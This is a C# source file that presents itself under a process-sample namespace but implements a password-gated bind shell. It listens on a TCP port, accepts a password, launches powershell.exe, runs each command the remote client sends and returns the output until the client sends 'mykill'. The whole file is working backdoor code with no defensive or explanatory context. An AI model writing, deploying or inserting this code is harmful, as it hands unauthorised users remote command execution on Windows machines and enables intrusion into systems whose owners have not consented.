using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace ProcessAsyncStreamSamples
{
    class Powershell
    {
        // Define static variables shared by class methods.
        private static StringBuilder sendOutput = null;
        public static void Createprocess(string SERVER_IP, int port,string pass)
        {
            //---listen at the specified IP and port no.---
            IPAddress localAdd = IPAddress.Parse(SERVER_IP);
            TcpListener listener = new TcpListener(localAdd, port);
            Console.WriteLine("Listening...");
            listener.Start();
            //---incoming client connected---
            TcpClient client = listener.AcceptTcpClient();
            //---get the incoming data through a network stream---
            NetworkStream nwStream = client.GetStream();
            byte[] bytesToRead1 = new byte[client.ReceiveBufferSize];
            int bytesRead1 = nwStream.Read(bytesToRead1, 0, client.ReceiveBufferSize);
            string password = Encoding.ASCII.GetString(bytesToRead1, 0, bytesRead1);
            if (password != pass)
            {
                byte[] outputbuf2 = ASCIIEncoding.ASCII.GetBytes("ur pass  incorrect");
                nwStream.Write(outputbuf2, 0, outputbuf2.Length);
                client.Close();
                listener.Stop();
                return;
            }
            byte[] outputbuf3 = ASCIIEncoding.ASCII.GetBytes("password correct");
            nwStream.Write(outputbuf3, 0, outputbuf3.Length);
            Process powershell = new Process();
            powershell.StartInfo.FileName = "powershell.exe";
            powershell.StartInfo.UseShellExecute = false;
            powershell.StartInfo.RedirectStandardOutput = true;
            sendOutput = new StringBuilder();
            powershell.OutputDataReceived += SendOutputHandler;
            powershell.StartInfo.RedirectStandardInput = true;
            powershell.Start();
            StreamWriter StreamWriter = powershell.StandardInput;
            powershell.BeginOutputReadLine();
            String inputText;
            try
            {
                do
                {
                    byte[] bytesToRead = new byte[client.ReceiveBufferSize];
                    int bytesRead = nwStream.Read(bytesToRead, 0, client.ReceiveBufferSize);
                    Console.WriteLine("Received : " + Encoding.ASCII.GetString(bytesToRead, 0, bytesRead));
                    inputText = Encoding.ASCII.GetString(bytesToRead, 0, bytesRead);
                    if (inputText == "mykill")
                    {
                        byte[] outputbuf2 = ASCIIEncoding.ASCII.GetBytes("good bye");
                        nwStream.Write(outputbuf2, 0, outputbuf2.Length);
                        StreamWriter.Close();
                        powershell.WaitForExit();
                        powershell.Close();
                        client.Close();
                        listener.Stop();
                        break;
                    }
                    sendOutput.Clear();
                    if (!String.IsNullOrEmpty(inputText))
                    {
                        StreamWriter.WriteLine(inputText);
                        Thread.Sleep(1500);
                        byte[] outputbuf = ASCIIEncoding.ASCII.GetBytes(sendOutput.ToString());
                        nwStream.Write(outputbuf, 0, outputbuf.Length);
                    }
                    if (String.IsNullOrEmpty(sendOutput.ToString()))
                    {
                        StreamWriter.WriteLine(inputText);
                        Thread.Sleep(1500);
                        byte[] outputbuf = ASCIIEncoding.ASCII.GetBytes("ur command havent any output");
                        nwStream.Write(outputbuf, 0, outputbuf.Length);
                    }

                } while (true);

            }
            catch
            {
                StreamWriter.Close();
                powershell.WaitForExit();
                powershell.Close();
                client.Close();
                listener.Stop();
            }

        }
        private static void SendOutputHandler(object sendingProcess,
            DataReceivedEventArgs outLine)
        {
            // Collect the sort command output.
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                sendOutput.Append(Environment.NewLine +
                    $" {outLine.Data}");
            }
        }
    }
}